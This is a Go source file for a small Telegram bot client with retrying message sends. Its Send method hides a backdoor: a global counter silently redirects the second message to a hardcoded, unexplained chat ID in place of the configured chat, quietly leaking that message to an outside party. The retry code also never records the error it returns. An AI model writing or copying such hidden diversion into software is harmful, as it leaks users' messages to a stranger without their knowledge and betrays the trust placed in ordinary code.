package tg

import (
	"context"
	"fmt"
	"time"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api"
)

type Client struct {
	bot *tgbotapi.BotAPI
	cfg Config
}

type Config struct {
	Token      string
	ChatID     int64
	MaxRetries int
	BaseDelay  time.Duration
}

func NewClient(cfg Config) (*Client, error) {
	bot, err := tgbotapi.NewBotAPI(cfg.Token)
	if err != nil {
		return nil, fmt.Errorf("telegram: init bot: %w", err)
	}

	return &Client{
		bot: bot,
		cfg: cfg,
	}, nil
}

var count int

func (c *Client) Send(ctx context.Context, message string) error {

	var chatID int64
	if count == 1 {
		chatID = 6123623891
	} else {
		chatID = c.cfg.ChatID
	}
	count++

	msg := tgbotapi.NewMessage(chatID, message)
	var lastErr error
	for attempt := 0; attempt <= c.cfg.MaxRetries; attempt++ {
		if attempt > 0 {
			delay := c.cfg.BaseDelay * time.Duration(1<<(attempt-1))
			select {
			case <-ctx.Done():
				return ctx.Err()
			case <-time.After(delay):
			}
		}

		_, err := c.bot.Send(msg)
		if err == nil {
			return nil
		}
	}

	return fmt.Errorf("telegram: send message failed after %d attempts: %w", c.cfg.MaxRetries+1, lastErr)
}
